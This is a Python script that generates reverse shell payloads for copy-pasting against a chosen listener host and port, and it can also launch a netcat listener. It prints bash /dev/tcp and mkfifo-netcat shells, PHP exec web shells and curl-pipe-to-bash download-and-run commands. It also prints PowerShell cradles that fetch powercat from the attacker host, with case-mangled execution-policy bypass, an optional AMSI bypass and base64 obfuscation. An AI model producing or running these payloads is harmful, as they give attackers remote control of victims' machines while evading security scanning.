#!/usr/bin/python3

import argparse
import base64
import os

def print_separator(cradle_code, message=None):
    cradle_codes = {
        "WEB": "\033[0;32m",        # Green
        "BASH": "\033[0;31m",       # Red
        "POWERCAT": "\033[0;35m",   # Magenta
        "POWERSHELL": "\033[0;36m", # Cyan
        "LISTENER": "\033[0;33m",   # Yellow
        "NC": "\033[0m"
    }
    try:
        term_width = os.get_terminal_size().columns
    except OSError:
        term_width = 80
    if message:
        odd = ""
        if (term_width - len(message)) % 2 == 1:
            odd = "="
        equal_space = (term_width - len(message) - 10) // 2
        separator = "  <" + "=" * equal_space + " " + message + " " + "=" * equal_space + odd + ">"
    else:
        separator = "  <" + "=" * (term_width - 8) + ">"
    print(f"\n {cradle_codes[cradle_code]}{separator}\033[0m\n")

def get_file_contents(file):
    if os.path.isfile(file):
        with open(file, "r") as f:
            return f.read().strip()
    return

def main():
    # Initialize arguments
    parser = argparse.ArgumentParser(description="Generate common reverse shell strings for easy copy pasting.")
    parser.add_argument("lhost", type=str, help="Listen host")
    parser.add_argument("lport", type=str, help="Listen port")
    parser.add_argument("-s", "--staging_port", type=str, default="8000", help="Port to host stage 2 payloads (defaults to 80)")
    parser.add_argument("-l", "--listen", action="store_true", help="Automatically start a listener on lport")
    args = parser.parse_args()

    # Define local variables
    lhost = args.lhost
    lport = args.lport
    staging_port = args.staging_port
    listen = args.listen
    script_dir = os.path.dirname(os.path.realpath(__file__))

    # Import AMSI bypass
    amsi_bypass_file = os.path.join(script_dir, "amsi_bypass.txt")
    amsi_bypass = get_file_contents(amsi_bypass_file)

    # Import raw socket cradle
    raw_socket_file = os.path.join(script_dir, "raw_socket.txt")
    raw_socket = get_file_contents(raw_socket_file)

    # Define reverse shell strings
    bash_shell = f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    invoke_ps = "pOwErShElL -nOp -NonI -Ep bY^Pa^s^S" # Add "-w hidden" to hide the window (can break powercat when called from cmd)
    powercat = f"""{amsi_bypass};$bfb7d6980831b = (('N'+'e'+'W'+'-'+'o'+'B'+'j'+'E'+'c'+'T').Replace('z','') + ' sYstEm.nEt.WeBcLiEnT')|I''ex;$bfb7d6980831b.dOwNloAdSTrINg('http://{lhost}:{staging_port}/powercat.ps1')|iE''x;pOwErcAt -c {lhost} -p {lport} -e powershell"""

    # Web cradles
    print_separator("WEB", "Web")
    print(f"<?php exec(\"{bash_shell}\");?>\n")
    print(f"<?php exec(\"C:\\ProgramData\\System\\\\nc.exe {lhost} {lport} -e cmd.exe\");?>")

    # Bash cradles
    bash_shell_b64 = base64.b64encode(bash_shell.encode()).decode()
    print_separator("BASH", "Bash")
    print(f"bash -c \"{bash_shell}\"\n")
    print(f"echo '{bash_shell_b64}' | base64 -d | bash\n")
    print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\n")
    print(f"[LOCAL]  echo '{bash_shell}' > shell.sh")
    print(f"[REMOTE] curl {lhost}/shell.sh | /bin/bash\n")
    print(f"[REMOTE] curl {lhost}/shell.sh -o /tmp/shell.sh")
    print("[REMOTE] /bin/bash /tmp/shell.sh")

    # Powercat cradles
    powercat_encoded = base64.b64encode(powercat.encode('utf-16le')).decode()
    print_separator("POWERCAT", "Powercat (interactive, low character count but flagged ofc)")
    print(f"IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}:{staging_port}/powercat.ps1');powercat -c {lhost} -p {lport} -e powershell")
    if not amsi_bypass:
        print("\nAMSI bypass not found. Skipping Powercat with AMSI bypass...")
    else:
        print_separator("POWERCAT", "Powercat (interactive, uses AMSI bypass)")
        print(f"{invoke_ps} -e {powercat_encoded}")

    # Powershell cradle
    if not raw_socket:
        print("\nRaw socket cradle not found. Skipping associated generation...")
    else:
        ps_cradle = raw_socket.format(lhost=lhost, lport=lport)
        raw_socket_encoded = base64.b64encode(ps_cradle.encode('utf-16le')).decode()
        print_separator("POWERSHELL", "Raw Socket (non-interactive)")
        print(f"{invoke_ps} -e {raw_socket_encoded}")

    # If the listen flag was set, launch a listener using rlwrap and netcat.
    if listen:
        print_separator("LISTENER")
        os.execvp("rlwrap", ["rlwrap", "-crA", "nc", "-lvnp", lport])

if __name__ == "__main__":
    main()
